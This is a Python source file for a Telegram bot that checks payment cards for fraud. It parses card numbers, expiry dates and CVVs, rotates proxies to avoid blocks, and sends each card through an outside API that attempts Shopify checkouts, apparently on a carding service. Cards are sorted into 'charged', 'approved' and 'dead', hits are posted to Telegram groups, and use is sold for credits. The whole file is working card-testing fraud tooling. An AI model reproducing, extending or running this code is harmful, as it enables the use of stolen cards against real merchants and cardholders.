from live_emoji import plan_badge, dev_badge
from privacy import protect
import asyncio
import aiohttp
import threading as _threading
import random
import re
import logging
import time
import string
import psycopg2.extras
import os
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO
from collections import deque
from html import escape as html_escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters.callback_data import CallbackData

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, update_user_stats, get_db_connection, deduct_credits_atomic, increment_lifetime_stats
from bin import get_bin_info
from sub import get_premium_status
from proxy import global_proxy_manager

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CUSTOM_CHARGED_EMOJI_IDS = [
    "5287658362660474522",
    "5287547831677112267",
    "5285373878145667586",
    "5287360712836928126",
    "5285024405246725814",
    "5335059614603945751",
    "5197350061012436657",
    "5307554373457440075",
    "5296742257146241213",
    "5285186510197381130",
    "5920279261217820923",
    "5920049201294610186",
    "5235630047959727475",
    "5402114808692626532",
    "5285181291812120474",
    "5283139309740765379",
    "5323415975444372303",
    "5323674506705785412",
    "6026218958900695642",
    "6026031174340579961",
    "6026088864341299395",
    "6023832365833392885",
    "5321167461280662157",
    "5364040533498932357",
    "5462902520215002477",
    "5800688138833629633",
    "5850479475652824718",
    "6170417452162225096",
    "6190572956293272876",
    "5321125250342083365",
    "5765013255709790048",
    "5192786142864356407",
    "5994295021040309628",
    "5231265132826343149",
    "6037083366438737901",
    "5348296214183950233",
    "5769120678963843265",
    "5274115261329322709",
    "5380111356227770863",
    "5206449705143262854",
    "5866429502426454515",
]

import itertools as _itertools
_charged_emoji_cycle = _itertools.cycle(CUSTOM_CHARGED_EMOJI_IDS)

def get_next_charged_emoji_id() -> str:
    return next(_charged_emoji_cycle)

CUSTOM_APPROVED_EMOJI_ID = "6100515480735321747"
CUSTOM_DECLINED_EMOJI_ID = "5273914604752216432"

# Responses that are counted as APPROVED (saved in the approved/live file).
APPROVED_RESPONSES = [
    "INSUFFICIENT_FUNDS",
    "3DS_REQUIRED",
    "INCORRECT_CVC",
    "INCORRECT_ZIP",
]

_RESULT_EMOJI = {"CHARGED": "💎", "APPROVED": "✅", "DEAD": "❌", "ERROR": "⚠️"}

def _export_emoji(card_data: dict, response) -> str:
    """Emoji for an exported result line, preferring the stored classification."""
    emoji = _RESULT_EMOJI.get(str(card_data.get('status', '')).upper())
    if emoji:
        return emoji
    r = str(response).upper()
    if "CHARGED" in r or "ORDER_PAID" in r:
        return "💎"
    if any(x in r for x in (APPROVED_RESPONSES + ["APPROVED", "INVALID_CVC"])):
        return "✅"
    if any(x in r for x in (
        "TIMEOUT", "CONNECTION ERROR", "MAX RETRIES", "JSON DECODE",
        "INVALID API", "UNKNOWN ERROR", "PROXY ERROR", "SITE ERROR", "API ERROR",
    )):
        return "⚠️"
    return "❌"

def _display(value, default: str = "N/A") -> str:
    """None/empty-safe display value (bin.py maps JSON fields with data.get(),
    so a null response yields an existing key holding None)."""
    if value is None:
        return default
    text = str(value).strip()
    return text or default

HIT_LOG_GROUP_ID       = -1003822850440
EXTRA_CHARGED_GROUP_ID = -1004330894683
BOT = "https://t.me/CHKXWIZ3_BOT"

BUTTON_LOCK_SECONDS = 30

MSH_SESSIONS  = {}
SESSION_LOCKS = {}

# ── Shared HTTP session for MSH API calls ──
_MSH_HTTP_SESSION = None

def _get_msh_http_session():
    global _MSH_HTTP_SESSION
    if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
        _MSH_HTTP_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=60),
            connector=aiohttp.TCPConnector(limit=500, ssl=False)
        )
    return _MSH_HTTP_SESSION

# ── Session GC ──────────────────────────────────────────
# Results stay exportable for 24 h after a session finishes.
_MSH_SESSION_MAX_AGE = 86400

def _cleanup_msh_sessions():
    import time as _t
    cutoff = _t.time() - _MSH_SESSION_MAX_AGE
    dead = [
        sid for sid, s in list(MSH_SESSIONS.items())
        if s.get('status') in ('<b>Sᴜᴍᴍᴀʀʏ</b>', '<b>Sᴛᴏᴘᴘᴇᴅ</b>') and s.get('start_time', 0) < cutoff
    ]
    for sid in dead:
        MSH_SESSIONS.pop(sid, None)
        SESSION_LOCKS.pop(sid, None)

def _start_msh_gc():
    import time as _t
    def _loop():
        while True:
            _t.sleep(600)
            try:
                _cleanup_msh_sessions()
            except Exception:
                pass
    _threading.Thread(target=_loop, daemon=True, name='msh_gc').start()

_start_msh_gc()

router = Router()

API_BASE_URL = "http://carders2.up.railway.app/shopii"
#API_BASE_URL = "http://38.247.142.170:2000/shopii"
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MshResultCallback(CallbackData, prefix="mshr"):
    session_id:  str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASK PROXY FUNCTION (defined before use)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def mask_proxy(proxy: str) -> str:
    """Mask a proxy string for logging."""
    try:
        if not proxy:
            return "None"
        if '@' in proxy:
            parts = proxy.split('@')
            if len(parts) == 2:
                return f"***@{parts[1]}"
        return proxy[:15] + "***" if len(proxy) > 15 else "***"
    except Exception:
        return "***"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGER CLASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    """
    Proxy Manager — Only fails on REAL proxy errors.
    """

    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PAID', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVC', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR',
        'DO_NOT_HONOR', 'EXPIRED_CARD',
        'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
        'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD'
    ]

    PROXY_ERROR_PATTERNS = [
        'connection error', 'connection refused', 'connection reset',
        'timeout', 'timed out', 'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407',
        'tunnel failed', 'socks error', 'ssl error',
        'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop',
        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
        'proxy error', 'bad gateway'
    ]

    def __init__(self, proxies_list: List[str], session_id: str):
        self.session_id  = session_id
        self.raw_proxies = list(set(proxies_list))

        self.all_proxies = [self._normalize_proxy(p) for p in self.raw_proxies]
        self.all_proxies = [p for p in self.all_proxies if p]

        self.proxy_queue    = deque(self.all_proxies)
        self.failed_proxies = {}
        self.success_counts = {proxy: 0 for proxy in self.all_proxies}
        self.total_uses     = 0
        self.cooldown_seconds = 60

        logging.info(
            f"[ProxyManager] Initialized with {len(self.all_proxies)} "
            f"normalized proxies for session {session_id}"
        )

    def _normalize_proxy(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip():
            return None

        proxy = proxy.strip()

        if proxy.startswith(('http://', 'https://')):
            return proxy
        if proxy.startswith('socks5://'):
            return 'http://' + proxy[9:]
        if '@' in proxy and ':' in proxy.split('@')[0]:
            return f'http://{proxy}'

        parts = proxy.split()
        if len(parts) == 4:
            user, pwd, host, port = parts
            return f'http://{user}:{pwd}@{host}:{port}'

        if ':' in proxy and '@' not in proxy:
            parts = proxy.split(':')
            if len(parts) == 2 and parts[1].isdigit():
                return f'http://{proxy}'

        return f'http://{proxy}'

    def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
        if not self.all_proxies:
            return None, False

        current_time = time.time()
        attempts     = 0
        max_attempts = len(self.all_proxies) * 2

        while attempts < max_attempts:
            if not self.proxy_queue:
                self.proxy_queue = deque(self.all_proxies)

            proxy = self.proxy_queue.popleft()

            if proxy in self.failed_proxies:
                fail_data      = self.failed_proxies[proxy]
                cooldown_until = fail_data.get('cooldown_until', 0)

                if current_time < cooldown_until:
                    self.proxy_queue.append(proxy)
                    attempts += 1
                    continue
                else:
                    del self.failed_proxies[proxy]

            self.proxy_queue.append(proxy)
            self.total_uses += 1
            return proxy, True

        if self.failed_proxies:
            best_proxy = min(
                self.failed_proxies.keys(),
                key=lambda p: self.failed_proxies[p].get('cooldown_until', float('inf'))
            )
            logging.warning(
                f"[ProxyManager] All proxies in cooldown, forcing {mask_proxy(best_proxy)}"
            )
            self.total_uses += 1
            return best_proxy, True

        return None, False

    def report_success(self, proxy: str):
        if proxy in self.success_counts:
            self.success_counts[proxy] += 1
        else:
            self.success_counts[proxy] = 1

        if proxy in self.failed_proxies:
            del self.failed_proxies[proxy]

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        response_lower = api_response.lower() if api_response else ''

        for success_indicator in self.SUCCESS_RESPONSES:
            if success_indicator.lower() in response_lower:
                return False

        if '429' in response_lower or 'too many requests' in response_lower:
            return False

        if any(x in response_lower for x in ['no available products', 'not shopify', 'site requires login']):
            return False

        if 'step ' in response_lower and ('failed' in response_lower or 'error' in response_lower):
            return False

        if any(x in response_lower for x in ['receipt', 'could not extract', 'missing']):
            return False

        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
            return False

        for error_pattern in self.PROXY_ERROR_PATTERNS:
            if error_pattern in response_lower:
                return True

        return False

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        current_time = time.time()

        if self.is_real_proxy_error(api_response, http_status):
            if proxy not in self.failed_proxies:
                self.failed_proxies[proxy] = {
                    'fail_count':    0,
                    'first_fail':    current_time,
                    'last_fail':     current_time,
                    'cooldown_until': 0
                }

            fail_data = self.failed_proxies[proxy]
            fail_data['fail_count'] += 1
            fail_data['last_fail']   = current_time

            fail_count          = fail_data['fail_count']
            cooldown_multipliers = [30, 60, 120, 300, 600, 900, 1800]
            multiplier_index    = min(fail_count - 1, len(cooldown_multipliers) - 1)
            cooldown_duration   = cooldown_multipliers[multiplier_index]

            fail_data['cooldown_until'] = current_time + cooldown_duration

            logging.warning(
                f"[ProxyManager] Proxy FAILED (real error): {mask_proxy(proxy)} "
                f"(#{fail_count}) Cooldown: {cooldown_duration}s | Response: {api_response[:80]}"
            )
        else:
            self.report_success(proxy)
            logging.debug(
                f"[ProxyManager] Proxy OK: {mask_proxy(proxy)} | "
                f"Response: {api_response[:60]}"
            )

    def get_stats(self) -> dict:
        active_count = len([p for p in self.all_proxies if p not in self.failed_proxies])
        failed_count = len(self.failed_proxies)
        return {
            'total_proxies':      len(self.all_proxies),
            'active':             active_count,
            'failed':             failed_count,
            'total_uses':         self.total_uses,
            'success_distribution': dict(self.success_counts)
        }

    def get_available_count(self) -> int:
        current_time = time.time()
        available = 0
        for proxy in self.all_proxies:
            if proxy in self.failed_proxies:
                if current_time >= self.failed_proxies[proxy].get('cooldown_until', 0):
                    available += 1
            else:
                available += 1
        return available


def build_user_link(user_obj) -> str:
    """
    Returns a properly clickable HTML hyperlink for the user.
    """
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD EXTRACTION FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})$',
        r'^(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})$',
        r'^(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})$',
        r'^(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})$',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]

    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            groups = match.groups()
            if len(groups) == 5 and pattern.startswith(r'^\/[a-zA-Z]+\s+'):
                cc, mm, yy, cvv = groups[1], groups[2], groups[3], groups[4]
            elif len(groups) == 4:
                cc, mm, yy, cvv = groups
            else:
                continue
            month = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return cc, month, yy, cvv
    return None


def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def log_hit_to_mshh(user_id, username, first_name):
    try:
        with open("mshh.txt", "a", encoding="utf-8") as f:
            u_name = username if username else "None"
            f_name = first_name if first_name else "Unknown"
            f.write(f"{user_id}|{u_name}|{f_name}\n")
    except Exception as e:
        logging.error(f"Error writing to mshh.txt: {e}")


RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed',
    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
    'could not resolve host', 'connect tunnel failed',
    'timeout', 'proxy error',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'no available products found',
    'could not extract receiptid',
    'could not extract signedhandles',
    'receiptid missing',
    'response missing receiptid',
    'products.json',
    'returned status 429',
    'returned status 500',
    'returned status 502',
    'returned status 503',
    'returned status 504',
    'store incompatible',
    'extract signedHandles',
    'missing receiptId',
    'Error:',
    "INVALID_PAYMENT_METHOD",
    "Site not supported",
    "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
    "PAYMENT_FAILED",
    'INVENTORY_FAILURE',
    'PAYMENTS_CREDIT_CARD_GENERIC',
    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
    'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE',
    'Site Error (retried 20x): API Error: HTTP 429',
    'Site Error (retried 20x)',
    'Site Error',
    'PAYMENTS_CREDIT_CARD_SESSION_ID',
    'Site Error (retried 20x): Step 1 failed: POST /cart/add.js returned status 503',
    'Site Error (retried 20x): API Error: HTTP 400',
    'Site Error (retried 20x): PAYMENTS_CREDIT_CARD_GENERIC',
    'VALIDATION_CUSTOM',
    'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH',
    'TAX_NEW_TAX_MUST_BE_ACCEPTED',
    'PAYMENTS_POSITIVE_AMOUNT_EXPECTED',
    'MISMATCHED_BILL',
    'PROXY_DEAD',
    'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH',
    'WAITING_PENDING_TERMS',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'MERCHANDISE_OUT_OF_STOCK',
    ' Site Error (retried 20x): Step 0 failed: GET https://0211h0-ei.myshopify.com/products.json?limit=250 returned status 429',
    '429',
    'returned status 429',
    'NO_PRODUCT',
    'no shipping handle obtained',
    'UNKNOWN',
    'FAKE_APPROVAL_DETECTED',
    '<b>Proxy Dead!</b>',
    'ARTIFACT_DISSATISFACTION',
    'exceeded 60 poll attempts',
    'CAPTCHA_METADATA_MISSING',
    'DELIVERY_ADDRESS2_REQUIRED',
    'PAYMENTS_TERMS_CHANGED',
    #'GENERIC_ERROR',
    'PATMENTS_METHOD',
    'TOKENIZATION_ERROR',
    #'CART_ERROR',
    'SITE_ERROR',
]

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]


def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "<b>Sᴛᴏᴘᴘᴇᴅ</b>"


def is_buttons_locked(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return False
    elapsed = time.time() - session.get('start_time', 0)
    return elapsed < BUTTON_LOCK_SECONDS


def get_remaining_lock(session_id: str) -> int:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return 0
    elapsed   = time.time() - session.get('start_time', 0)
    remaining = BUTTON_LOCK_SECONDS - elapsed
    return max(0, int(remaining) + 1)


async def get_anime_gif():
    import aiohttp
    reaction = random.choice(REACTIONS)
    api_url  = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return (
        "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6"
        "SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7hx5S3yCjQ8I/giphy.gif"
    )


async def get_user_plan_name(user_id):
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn   = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute(
                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cursor.fetchone()
                conn.close()
                return row['plan'].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "FREE"


def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total          = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0


def is_expired(mm: str, yy: str) -> bool:
    try:
        current_date  = datetime.now()
        current_year  = current_date.year % 100
        current_month = current_date.month
        exp_year      = int(yy)
        exp_month     = int(mm)
        if exp_year < current_year:
            return True
        elif exp_year == current_year:
            if exp_month < current_month:
                return True
        return False
    except ValueError:
        return True


def get_sites():
    sites = []
    try:
        if os.path.exists("sites.txt"):
            with open("sites.txt", "r", encoding="utf-8", errors="ignore") as f:
                sites = [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"Error reading sites.txt: {e}")
    return sites


def get_user_display(user_obj, plan_name):
    return f"{user_obj.first_name} ({plan_name})"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API PROCESSING FUNCTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_card_api(
    cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str
) -> Tuple[bool, str, str, str, str, str, str, int]:
    """
    Process card using the API endpoint.

    Returns:
        Tuple of (success, message, url, gateway, price, currency, proxy_status, http_status)
    """
    import aiohttp

    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
    api_url      = f"{API_BASE_URL}?site={site}&cc={cc_formatted}&proxy={proxy}"

    logging.debug(f"[API] Processing {cc[:6]}**** via {mask_proxy(proxy)}")

    http_status = None

    try:
        _http = _get_msh_http_session()
        async with _http.get(api_url) as response:
            http_status = response.status

            if response.status == 200:
                data = await response.json()

                gateway      = data.get("Gateway", "Shopify Payments")
                price        = data.get("Price", "0.00")
                currency     = data.get("Currency", "USD")
                proxy_raw    = data.get("Proxy", "Dead")
                api_response = data.get("Response", "Unknown Error")
                status       = data.get("Status", "false")

                success      = status.lower() == "true"
                proxy_status = "Live" if "live" in str(proxy_raw).lower() else "Dead"

                return (success, api_response, site, gateway, price, currency, proxy_status, http_status)
            else:
                return (
                    False, f"API Error: HTTP {response.status}",
                    site, "Shopify Payments", "0.00", "USD", "Error", http_status
                )

    except asyncio.CancelledError:
        raise
    except aiohttp.ClientError as e:
        return (False, f"Connection Error: {str(e)}", site, "Shopify Payments", "0.00", "USD", "Error", None)
    except Exception as e:
        return (False, f"Error: {str(e)}", site, "Shopify Payments", "0.00", "USD", "Error", None)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE GENERATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    cards_list = []

    if result_type == "charged":
        cards_list  = session.get('charged_cards', [])
        type_label  = "ᏟꮋꭺꭱƦᏽꭼꭰ"
        type_emoji  = "💎"
    elif result_type == "live":
        cards_list  = session.get('live_cards', [])
        type_label  = "ᎪꮲꮲꭱƦꮎꮩꭼꭰ"
        type_emoji  = "✅"
    elif result_type == "dead":
        cards_list  = session.get('dead_cards', [])
        type_label  = "Dᴇᴀᴅ"
        type_emoji  = "❌"
    else:
        cards_list = (
            session.get('charged_cards', []) +
            session.get('live_cards', []) +
            session.get('dead_cards', []) +
            session.get('error_cards', [])
        )
        type_label = "Aʟʟ"
        type_emoji = "📁"

    # Approved file: show INSUFFICIENT_FUNDS first, then all remaining responses.
    if result_type == "live":
        cards_list = sorted(
            cards_list,
            key=lambda c: 0 if "INSUFFICIENT_FUNDS" in str(c.get('response', '')).upper() else 1
        )

    total_count  = len(cards_list)
    user_display = get_user_display(user_obj, plan_name)

    lines = []
    lines.append(f"[᯼] Gᴀᴛᴇ ➺ Sʜᴏᴘɪғʏ  | 0-5 USD")
    lines.append("━━━━━━━━━━━━━━━━━━━")
    lines.append(f"   [◈] Rᴇsᴜʟᴛ ➺ {type_label} {type_emoji}")
    lines.append(f"   [ᱯ] Tᴏᴛᴀʟ ➺ {total_count}")
    lines.append("━━━━━━━━━━━━━━━━━━━")

    if total_count == 0:
        lines.append("⚠️ No cards found for this category")
    else:
        for card_data in cards_list:
            cc       = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            price    = card_data.get('price', 'N/A')
            currency = card_data.get('currency', 'USD')
            lines.append(f"{cc} | {response} | ({price} {currency})")

    content     = "\n".join(lines)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map  = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename  = f"WIZXCHK_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"

    return file_buffer, filename, total_count


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MESSAGE SENDING HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_name, proxy_status_formatted, price, currency="USD"):
    user_link       = protect(build_user_link(user_obj))
    gateway_display = html_escape(f"Sʜᴏᴘɪғʏ | {price} {currency}")
    safe_response   = html_escape(str(response_msg))
    safe_plan       = html_escape(str(plan_name))

    caption = (
        f"<b><a href='https://t.me/broken_wiz'>[  ɧ ι 𝛕  ]</a></b> <b>➵ ᏟꮋꭺꭱƦᏽꭼꭰ</b> <tg-emoji emoji-id=\"{get_next_charged_emoji_id()}\">💎</tg-emoji>\n"
        f"<b>Gᴀᴛᴇ ➵</b> <b>{gateway_display}</b>\n"
        f"<b><a href='https://t.me/broken_wiz'>⬡</a> Rᴀᴡ ➵</b> <code>{safe_response}</code> <tg-emoji emoji-id=\"5801044672658805468\">✨</tg-emoji>\n"
        f"<b><a href='https://t.me/broken_wiz'>⬡</a> ➵</b> <b>{user_link}</b> {plan_badge(safe_plan)}"
    )
    
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="𝘾𝙃𝙆 𝕏 [𝙒 𝙄 𝙕] ", url=BOT, style="primary",
        icon_custom_emoji_id="5445104308884370368")]
    ])

    try:
        await bot.send_message(
            chat_id=HIT_LOG_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Error sending hit log: {e}")


async def send_approved_msg_to_user(
    bot: Bot, cc_formatted, response_msg, bin_data,
    proxy_status_formatted, api_price, user_obj, plan_name, currency="USD"
, time_take=0.0):
    """Send the approved hit to the user's DM (private chat)."""
    bin_scheme   = html_escape(_display(bin_data.get("scheme")))
    bin_bank     = html_escape(_display(bin_data.get("bank")))
    country_name = html_escape(_display(bin_data.get("country")))
    country_flag = _display(bin_data.get("country_emoji"), "")
    bin_country  = f"{country_flag} {country_name}".strip() if country_flag else country_name
